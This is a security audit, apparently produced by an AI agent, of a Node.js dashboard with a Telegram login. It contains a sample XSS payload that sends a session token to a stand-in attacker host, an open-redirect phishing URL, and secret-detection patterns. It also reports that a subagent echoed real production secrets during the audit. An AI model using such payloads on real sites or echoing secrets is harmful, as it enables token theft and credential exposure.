# Security audit — 2026-05-22

**Scope**: первый из 12 этапов чекапа. Фокус — application-level security: auth, admin gate, CORS/headers, file handlers, SQL, XSS, PII/secrets в логах, env hygiene, misc (proto pollution, CSRF, open redirect, SSRF). **Не покрыто** (по договорённости — другие этапы): nginx/ufw/certbot/Docker hardening (этап 9), TG-delivery (этап 8), pipeline cost-DoS (этап 4), SPA-trap protection (этап 11), performance.

**Method**: 8 параллельных haiku-агентов по 9 направлениям + ручная верификация top-3 high findings против исходников. Ничего в коде не менялось.

---

## Summary

**Counts**: 0 critical · 2 high · 5 medium · 5 low · 5 info · **17 findings total**.

Общее впечатление — auth/path/SQL/XSS базовая гигиена в порядке: `crypto.timingSafeEqual` для кодов и admin-key, anchored regex'и в file handlers, прямые параметризованные prepared statements в horoгом 90% запросов, нет ни одного `dangerouslySetInnerHTML`/`eval`/`Function()` после R4 sweep'а, monkey-patch security headers покрывает большинство путей, `maskId(chat_id)` применяется консистентно, Telegram bot-token не пересекает границу `telegram.js`, Apify через `Authorization: Bearer` (не в URL).

Слабые места — два actionable high (cost-burn endpoint и open redirect в video proxy), один state-drift с `TRUST_PROXY` (код в комментарии сам признаёт что не читает `X-Forwarded-For`, но SESSION_CONTEXT обещает обратное → rate-limit'ы в проде shared по всему nginx-трафику), и набор defense-in-depth gap'ов (CSP, protocol whitelist на `href`, localStorage для токена).

**Top-3 для разбора в первую очередь**:
1. **SEC-001** `/api/scan` без admin gate — cost burn от любого free-юзера
2. **SEC-002** Open redirect в video proxy fallback — phishing vector
3. **SEC-003** `TRUST_PROXY=1` не делает ничего в коде — rate-limit'ы в проде shared, contrast с SESSION_CONTEXT

---

## Findings

### [SEC-001] `/api/scan` доступен любому authenticated user — severity: **high**

* **Where**: `src/dashboard/server.js:2112-2125` (`_handleScan`)
* **What**: POST `/api/scan` триггерит full collect→PreStage→Stage 1→Stage 2 цикл. Хендлер проверяет только `appState.paused` и `appState.scanRunning`, **не** проверяет `req.user?.plan_name === 'admin'`. При этом mounting на роуте идёт после auth-middleware, то есть любой залогиненный (free/test/pro) может вызвать.
* **Impact**: Cost-burn vector. Free-юзер с валидным токеном дёргает `/api/scan` каждые ~2с → каждый scan тратит Stage 1 LLM (Gemini/Grok) + Stage 2 Grok x-search на top-кандидатах. Mitigated тем что `scanRunning` блочит конкурентные запуски, но как только цикл завершается — следующий запрос пробьётся. Также рассматривать как DoS на pipeline (легитимный scheduler ждёт пока всё закончится).
* **Fix**: добавить admin-check в начало хендлера, по образу `_handleCollectorToggle:1506-1533`. Семантически это admin-only operation — у scheduler'а свой scan через `startScheduler()` в `index.js`.

---

### [SEC-002] Open redirect в video proxy fallback через `?src=` — severity: **high**

* **Where**: `src/dashboard/server.js:2578` (Twitter video fallback), `src/dashboard/server.js:2478` (Reddit video fallback — по сводке агента, лично не верифицировал)
* **What**: Endpoint `/api/video/twitter/<id>.mp4?src=<URL>` пытается скачать видео по `src`, при failure делает `res.writeHead(302, { Location: srcRaw })` с **сырым `srcRaw` без валидации**. Для cached/successful path есть regex-фильтр `^https:\/\/video\.twimg\.com\/[^\s]+\.mp4(\?|$)`, но fallback path его пропускает.
* **Impact**: Аттакер шлёт жертве ссылку `https://catalystparser.io/api/video/twitter/abcd1234567890ef.mp4?src=https://phish.example/login`, forсит failure (например, валидный route-pattern ID но не существующий twitter source) → жертва кликает, видит свой trusted domain, редиректится на фишинг. Browser шарит cookies/токены если открыли в same context. Также SEO/abuse-list risk — могут трекать сайт как redirector.
* **Fix**: переиспользовать тот же fallback-URL что и cache path (`sourceUrl` после regex-валидации) или просто 502 при mux failure без редиректа. Для Reddit пути — то же самое (Read 2478 чтобы подтвердить, ⚠ assumes: agent-сводка корректна про этот файл).

---

### [SEC-003] `TRUST_PROXY=1` не имплементирован в коде, расходится с SESSION_CONTEXT — severity: **medium**

* **Where**: `src/dashboard/server.js:459-462` (комментарий в коде сам признаёт ограничение), rate-limiter logic вокруг
* **What**: SESSION_CONTEXT §«Production posture»/«Env keys» декларирует «`TRUST_PROXY=1` — app за nginx, rate-limit'ы читают real-IP через `X-Forwarded-For`». В реальности код **никогда** не читает `process.env.TRUST_PROXY` и не парсит `X-Forwarded-For` — про это так и написано в комментарии `_authInitiateAttempts` ("When/if we add trust-proxy support, this Map should key on X-Forwarded-For instead"). За nginx все запросы видятся как `127.0.0.1`.
* **Impact**: Per-IP cap `10 initiate / 5 мин` фактически работает как **глобальный cap на весь трафик через прокси**. Один атакующий (или скрипт у одного легитимного юзера в open tab) исчерпывает квоту за 5 минут и блочит initiate для всего сайта на оставшийся window. То же касается возможных будущих per-IP лимитов. Это не auth bypass, это DoS-flavor + state drift.
* **Fix**: либо реализовать `TRUST_PROXY` (читать `X-Forwarded-For` last hop, кейить Map по нему), либо обновить SESSION_CONTEXT, чтобы отражал реальность (комментарий в коде уже честный — расходится только spec). Без изменения кода предпочтительнее обновить spec и явно задокументировать что cap глобальный.

---

### [SEC-004] 6-значный код для auth — низкая энтропия — severity: **medium**

* **Where**: `src/dashboard/server.js:450-451` (verify cap = 5/15min), `src/db/database.js:712` (генерация кода)
* **What**: 10⁶ комбинаций. Cap 5 попыток / 15 минут per-sessionId. Атакующий ротирует sessionId через `/api/auth/initiate` (cap 10/5min, но per-IP — см. SEC-003 — фактически shared). Каждый initiate создаёт **новый random code**, так что cumulative brute-force не работает — каждая сессия = independent guess. Feasibility теоретически: 10⁶ × 5/cycle = ~200K initiate'ов нужно в лучшем случае, что нереалистично долго.
* **Impact**: Realistic exploit unlikely. Но: если когда-нибудь cap'ы ослабнут или кто-то добавит /reset которое генерит новый код без счётчика, окно сужается. Defense-in-depth gap.
* **Fix**: 8 цифр (10⁸, +2 порядка) — простое усиление без изменения UX (всё ещё easy-to-type из TG). Или alphabetic 6-char `[A-Z2-9]` (~10⁹). Дополнительно — экспоненциальный backoff per-code, не только per-session.

---

### [SEC-005] Session-токен в localStorage — XSS-dependent steal — severity: **medium**

* **Where**: `src/dashboard/server.js:~7097-7105` (по сводке агента, лично не верифицировал) ⚠ assumes: токен реально в localStorage, не в cookie
* **What**: 32-байтовый Bearer токен после verify хранится в `localStorage`. Любой XSS в SPA крадёт токен. Прямой XSS-вектор не нашли (SEC-006 — `href=javascript:` — единственный кандидат, и он защищён валидацией на ingestion). Но потенциальные follow-on XSS векторы (через нового вендора, через ошибку в новом feature) → токен немедленно exfiltrate.
* **Impact**: TTL токена не проверял (надо подтвердить). При длинном TTL (30 days по сводке агента) — окно эксплуатации существенное.
* **Fix**: `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict; Path=/`. Это требует CSRF-token для mutating endpoints (`Origin`-check одного не хватит), но defense-in-depth существенно сильнее. Альтернатива — сократить TTL до 1-7 дней + ротация на каждом запросе.

---

### [SEC-006] `<a href={trend.url}>` без protocol whitelist — XSS via `javascript:` — severity: **medium**

* **Where**: `src/dashboard/server.js:~9805`, `src/admin/server.js:~4327` (по сводке агента) ⚠ assumes: указанные строки корректны
* **What**: JSX `href={trend.url}` без `safeHref()` обёртки. React **не** фильтрует `javascript:`/`data:` в href. На ingestion `/api/manual-analysis` есть `/^https?:\/\//i.test(rawUrl)` — это закрывает основной путь. Но: alert decisions, trends из collectors, manual SQL inserts, data из старых миграций — все могут попасть в эту view без той валидации.
* **Impact**: Stored XSS через `trend.url = "javascript:fetch('//attacker/'+localStorage.token)"`. Если хоть один путь ingestion пропустит non-http url — финиш.
* **Fix**: render-time helper `safeHref(url)` который пропускает только `http://`/`https://` через `new URL(url)`. Применить ко всем местам где user-controlled/LLM-controlled данные идут в `href`. Defense-in-depth даже если ingestion validation есть.

---

### [SEC-007] `DASHBOARD_API_KEY` декоративный — false sense of security — severity: **medium**

* **Where**: `src/config.js:100-151` (warn без enforce), `src/dashboard/server.js:526-528`, `.env.example:280-282`
* **What**: env-переменная `DASHBOARD_API_KEY` читается в config, генерит warning при отсутствии, но **никогда не проверяется** против входящих запросов — реальная auth идёт через Telegram-code → Bearer токен. В `.env.example` описание звучит как «API ключ для защиты API… передавать через заголовок: X-API-Key», что вводит оператора в заблуждение (он думает что есть API-key layer).
* **Impact**: Оператор полагается на «strong API key» который ничего не защищает. Если кто-то когда-нибудь добавит middleware `X-API-Key` проверку «на всякий случай», расчёт на это будет неверным. Чистая misconfiguration risk.
* **Fix**: либо убрать `DASHBOARD_API_KEY` из config + `.env.example` целиком (он unused), либо переписать `.env.example` пояснить что real auth = Telegram-code flow. Третий вариант — реально валидировать `X-API-Key` для server-to-server scripts, но это больше работы.

---

### [SEC-008] `attemptsRemaining` в 401 ответе — info leak — severity: **low**

* **Where**: `src/dashboard/server.js:~830-834`
* **What**: 401 от `/api/auth/verify` возвращает `{ error, attemptsRemaining: N }`. Атакующий знает точно когда исчерпал window'у на конкретный sessionId.
* **Impact**: Minor information disclosure. Не повышает feasibility brute-force существенно (атакующий знает cap из docs/реверса). Просто экономит ему один guess.
* **Fix**: убрать `attemptsRemaining` из ответа, оставить только generic 401. Альтернативно — отправлять во всех 4xx ответах (включая успешные верифкации, для consistency) чтобы убрать signal через difference.

---

### [SEC-009] Video proxy `res.writeHead` без `res._defaultHeaders` merge — severity: **low**

* **Where**: `src/dashboard/server.js:2454, 2471, 2478, 2506, 2517, 2527, 2533, 2578, 2606, 2617` (Reddit + Twitter video handlers)
* **What**: Video endpoints вызывают `res.writeHead()` напрямую с явными headers, не разворачивая `...res._defaultHeaders`. Monkey-patch их не ловит. Response уходит без HSTS, X-Frame-Options DENY, X-Content-Type-Options nosniff, Referrer-Policy no-referrer.
* **Impact**: Сами видео — public Reddit/Twitter CDN контент, sensitivity низкая. Но missing X-Frame-Options позволяет iframe-embedding с другого домена (clickjacking возможен только при наличии interactive UI поверх видео — нет такого). Inconsistent security posture — defense-in-depth gap.
* **Fix**: spread `...res._defaultHeaders` в headers object каждого `writeHead()` в этих хендлерах. Или обёртка-helper `writeMediaHead(res, status, extras)`.

---

### [SEC-010] Admin SPA HTML без security headers — severity: **low**

* **Where**: `src/admin/server.js:~920`
* **What**: SPA-HTML endpoint вызывает `res.writeHead(200, { 'Content-Type': ..., 'Cache-Control': ... })` без `res._defaultHeaders` merge. HSTS/X-Frame/nosniff/Referrer-Policy не уходят.
* **Impact**: **Mitigated infrastructure'ом**: админка слушает 127.0.0.1:8081, доступна только через SSH-tunnel, public surface = 0. Чисто defense-in-depth gap на случай если в будущем proxy откроют наружу.
* **Fix**: merge `...res._defaultHeaders` в headers object на line 920.

---

### [SEC-011] URL string concat в hover-preview без `encodeURIComponent` — severity: **low**

* **Where**: `src/dashboard/server.js:~9028-9029, 9078` (по сводке агента)
* **What**: `'https://reddit.com/r/' + a.subreddit` и `'https://x.com/' + a.screenName` — concat без URL-encode. User data приходит из Reddit/Twitter API.
* **Impact**: Если Reddit/Twitter API когда-то вернут поле с `%` / `?` / `#` / `/`, URL получится malformed (`https://reddit.com/r/foo%bar` ломается parsing). Не угроза стороны атакующего напрямую — оба API контролируются третьими лицами и санитизуют output. Defense-in-depth + UX.
* **Fix**: `encodeURIComponent(a.subreddit)`.

---

### [SEC-012] Dynamic UPDATE column names в `_updatePlan` — severity: **low**

* **Where**: `src/admin/server.js:236-242`
* **What**: `sets.join(',')` где элементы — `${k}=?`. Whitelist `allowed = ['price_usd', 'alert_limit', 'history_days', 'max_sources']` отфильтровывает unauthorized поля **до** concat. Реальной SQL inj нет.
* **Impact**: Defense-in-depth issue. Если кто-то добавит поле в whitelist с особыми символами (или typo введёт `' OR '`), pattern даст trouble. Сейчас — безопасно благодаря static whitelist.
* **Fix**: переписать на явный switch или if/else блок по полю — отказ от dynamic concat. Cosmetic, не security-blocking.

---

### [SEC-013] `attachAuthCode` overwrites previous code on re-call — severity: **info**

* **Where**: `src/db/database.js:704-719`
* **What**: Повторный `/api/auth/initiate` для того же sessionId перезаписывает существующий code. Документировано в комментарии. By design — пользователь может перезапросить если потерял.
* **Impact**: Не security risk per se. Просто observation. Telegram message-edit history может содержать старый code (TG сам не редактирует — он шлёт новое сообщение), exposure minor.
* **Fix**: ничего, либо вернуть early-out если `code != null && !expired` для cleaner UX.

---

### [SEC-014] No Content-Security-Policy header — severity: **info**

* **Where**: оба server.js
* **What**: CSP не выставляется. Inline `<script>` (~7075+ dashboard) с server-injected JSON через `${JSON.stringify(...)}` — CSP с `unsafe-inline` нивелировал бы защиту, без него — SPA не работает. Архитектурный constraint.
* **Impact**: Меньше defense-in-depth слоёв. React JSX escape остаётся primary defense против XSS. Если будущий refactor вынесет SPA в отдельный файл (`bundle.js` через build-step) — CSP станет дешёвым выигрышем.
* **Fix**: рассмотреть в этапе 11 (code quality) — extract SPA from template literal → отдельный bundle → strict CSP (`script-src 'self'`). Сейчас архитектура не позволяет.

---

### [SEC-015] Clusterer LIKE без escape для `%`/`_`/`\` — severity: **info**

* **Where**: `src/analysis/clusterer.js:620-630`
* **What**: `'%' + words.slice(0, 2).join('%').substring(0, 35) + '%'` — pattern для DB history lookup. `title` приходит из collectors (Reddit/Twitter/TikTok API), не от user. Если в title есть `%`, MAtch будет over-broad. Не SQL inj.
* **Impact**: Defense-in-depth gap. False positives при кластеризации трендов содержащих `%`/`_` в названии (рекламные слоганы «50% off»).
* **Fix**: `title.replace(/[\\%_]/g, c => '\\' + c)` перед concat. Добавить `ESCAPE '\\'` к LIKE.

---

### [SEC-016] `OPENAI_REASONING_EFFORT` не документирован в `.env.example` — severity: **info**

* **Where**: `src/analysis/scorer.js:~409` (читается), `.env.example` (нет упоминания)
* **What**: env-переменная используется в коде для контроля reasoning effort на gpt-5.x моделях, но не описана в `.env.example`. SESSION_CONTEXT её упоминает в env-keys — частичная синхронизация.
* **Impact**: Operator не знает что эту переменную можно менять (тюнинг cost vs quality на Stage 1). Чистый documentation gap.
* **Fix**: добавить `OPENAI_REASONING_EFFORT=low # minimal|low|medium|high (только для gpt-5.x reasoning моделей)` в `.env.example`.

---

### [SEC-017] `.env.example` для `DASHBOARD_API_KEY` вводит в заблуждение — severity: **info**

* **Where**: `.env.example:280-282`, secondary к SEC-007
* **What**: Описание `# API ключ для защиты API… передавать через заголовок: X-API-Key` создаёт впечатление что API защищается этим ключом. На деле — Bearer-токены из Telegram-code flow.
* **Impact**: Misconfiguration risk (см. SEC-007). Чисто документация.
* **Fix**: переписать комментарий — либо «unused, kept for backwards compatibility» (если решено оставить env), либо удалить вместе с переменной.

---

## Verified safe

Прошло проверку, **в следующих чекапах можно не пересматривать**:

### Auth flow (`src/dashboard/server.js`)
* ✓ Constant-time code compare через `crypto.timingSafeEqual` — нет timing oracle на 6-digit code match.
* ✓ Token expiry enforced (`getUserByAuthToken` чекает `token_expires_at`).
* ✓ Logout инвалидирует токен (`revokeAuthToken` удаляет ряд).
* ✓ Code обнуляется после успешной verify — нельзя переиспользовать.
* ✓ Bearer токен — strict regex `^Bearer\s+([a-f0-9]{64})$/i` — malformed reject.
* ✓ Session fixation impossible: верифицированный sessionId блочит повторный attach.

### Admin gate
* ✓ `ADMIN_API_KEY` сравнивается через `crypto.timingSafeEqual` с decoy fallback (admin/server.js:24-31).
* ✓ Пустой `adminKey` → reject all (`_auth` → false).
* ✓ Все мутирующие endpoint'ы в `admin/server.js` за глобальным `_auth(req)`.
* ✓ `_handleCollectorToggle`, `_handlePresetWipe`, plan grant/revoke — admin-only check на бэке корректно.
* ✓ User feedback / threshold / alert-types — per-user scoping без cross-user mass-assignment.

### CORS
* ✓ Нигде нет wildcard `*` в `Access-Control-Allow-Origin`.
* ✓ Origin echo только из allowlist `ALLOWED_ORIGINS.includes(origin)`.
* ✓ `Access-Control-Allow-Credentials: true` только paired с allowlisted origin.
* ✓ Empty default env → CORS header не выставляется (same-origin only).
* ✓ `Vary: Origin` присутствует для cache isolation.
* ✓ Preflight: explicit Methods/Headers whitelist, не `*`, `Access-Control-Max-Age=600`.

### Path traversal — **all clean**
* ✓ `_handleBrandLogo`: hardcoded `path.join(cwd, 'assets', 'logo.png')`, route exact-match.
* ✓ `_handleCatSprite`: anchored regex `^\/assets\/cats\/cat-(idle|walk|walk-left|...)\.png$` + `path.join`.
* ✓ `_handleAuthAvatar`: cache-key из authenticated `req.user` (БД, не URL) + `replace(/[^A-Za-z0-9_-]/g, '_')`.
* ✓ Reddit video: anchored `^\/api\/video\/reddit\/[a-z0-9]+\.mp4$`.
* ✓ Twitter video: anchored `^\/api\/video\/twitter\/[a-f0-9]{16}\.mp4$` + strict src regex.
* ✓ admin/server.js: вообще нет file handlers (только API).

### SQL injection
* ✓ Dashboard feed: `sort` whitelist (5 values), `phase` whitelist, `q` LIKE escape `[\\%_]` + `ESCAPE '\\'`, остальные params параметризованы.
* ✓ Admin users search: `%${search}%` через `?` (parametrized).
* ✓ `manual-analysis.js`: LIKE escape применён после fix 16.05.
* ✓ Reddit/Twitter engagement lookups: ID валидируется regex (`\d+` / `[a-z0-9]{4,12}`) перед concat.

### XSS
* ✓ Ноль `dangerouslySetInnerHTML` (R4 sweep чистый, только комментарий-tombstone).
* ✓ Ноль `innerHTML` / `outerHTML` / `document.write`.
* ✓ Ноль `eval` / `new Function` / `setTimeout('string')`.
* ✓ JSX text — React escape работает для `trend.title`, `aiExplanation`, FavoriteNoteEditor.
* ✓ Ноль `<iframe src>` / `<object data>` с user-input.
* ✓ Body limit: 16KB (dashboard), 32KB (admin) — DoS via large body blocked.

### PII / secrets
* ✓ `maskId(chat_id)` применяется во всех logger calls (18 проверенных мест).
* ✓ Apify token через `Authorization: Bearer` (комментарий в коде объясняет undici URL-leak rationale).
* ✓ Telegram bot-token не пересекает границу `src/notifications/telegram.js` (`fetchFile()` возвращает `{buffer, contentType}`, URL остаётся внутри).
* ✓ `err.code` в catch'ах вместо `e.message` для request-path errors.
* ✓ Нет `JSON.stringify(env)` / `JSON.stringify(config)` в логах.

### Env hygiene
* ✓ Ноль hardcoded токенов в `src/**/*.js` (sk-, xai-, AKIA, bot[0-9]+:, apify_api_, Bearer literals).
* ✓ `.env` в `.gitignore`, не в git history.
* ✓ Hard-fail в prod на `XAI_API_KEY` / `TELEGRAM_BOT_TOKEN` / `ADMIN_API_KEY`.
* ✓ `docker-compose.yml`: только `env_file: .env` + non-sensitive defaults.
* ✓ `Dockerfile`: ноль `ENV X=secret`, ноль `COPY .env`.
* ✓ `deploy.ps1/.sh`: ноль inline credentials.
* ✓ Ports `127.0.0.1:8080` / `127.0.0.1:8081` (loopback only, наружу через nginx).

### Misc (proto pollution, CSRF, SSRF, ReDoS)
* ✓ `deepMerge` в `preset-config.js:561+`: iterates `Object.keys(defaults)`, не recursive merge в Object.prototype. Whitelist-style, защищён от `__proto__`/`constructor`/`prototype` keys.
* ✓ CSRF: вся auth через `Authorization: Bearer` / `X-Admin-Key` headers — browsers не auto-attach их cross-origin. Cookie-based session не используется → CSRF не applicable.
* ✓ SSRF: `url-resolver.js` хардкодит endpoint'ы (fxtwitter / reddit json / tiktok oembed), generic путь fetch'ит только для og:tag extraction, никакого file:// / 127.0.0.1 surface.
* ✓ ReDoS: проверенные regex'и (subject highlight, Reddit comment ID match) — без nested quantifiers, bounded ranges.

---

## Out of scope / followups

* **(этап 9, prod posture)** — nginx config: проверить что `Host`/`X-Real-IP`/`X-Forwarded-For` headers корректно forwarded, что `set_real_ip_from 127.0.0.1` + `real_ip_header X-Forwarded-For` действительно стоят. Связано с SEC-003 — если в коде когда-то заимплементят TRUST_PROXY, nginx должен быть готов.
* **(этап 11, code quality)** — extract SPA из template-literal в нормальные bundles, тогда: (а) strict CSP реалистичен (см. SEC-014), (б) меньше шансов на «backtick в комментарии → чёрный экран» (см. SESSION_CONTEXT «Ловушка server.js»).
* **(этап 8, TG delivery)** — verify `telegram.sendMessage`/`sendPhoto` не имеет HTML injection через `parse_mode='HTML'` + user-controlled trend.title в формате. Mongo Markdown special chars escape должны быть проверены — `formatter.js`.
* **(этап 4, cost-DoS)** — `/api/scan` (SEC-001) — это частный случай. Per-user throttle на Stage 1/2 LLM, Catalyst forecast, manual-analyze. Сейчас есть soft-cap (N/day per user) и 30-sec anti-dupe cooldown на manual-analyze — проверить что cap'ы реально применяются + что cap на нашей стороне в Map считается перед LLM call, не после.
* **(operational)** — один из subagent'ов при выполнении этого аудита процитировал реальные prod-секреты из локального `.env` в свой output (видимо, для finding'а про hardcoded secrets). Транскрипты sub-agent JSONL пишутся на диск (`%TEMP%\claude\...\tasks\*.output`). Это **не** leak за пределы машины — `.env` уже лежит локально, — но имеет смысл подумать: (а) задокументировать в AGENT_RULES что secret-grep'и **не должны** возвращать значения, только ключи + признак «present/missing»; (б) убедиться что в Claude Code telemetry/feedback не вкладываются полные transcript-output'ы агентов.
* **(observation, не security)** — `_handleScan` (SEC-001), `_handleConfig`, `_handleAuthAvatar` — паттерн именования handler'ов good, но они физически разбросаны по 3000+ строкам файла. Cosmetic refactor в этап 11.
* **(observation, не security)** — `attemptsRemaining` (SEC-008) — стоит подумать о UX: пользователь может из этого узнать что у него осталось 1 попытка и не хочет тратить → перезапросить код. Если убрать field — UX чуть ухудшится. Trade-off на обсуждение.

---

**Audit complete.** Жду решения какие finding'и фиксить первыми.
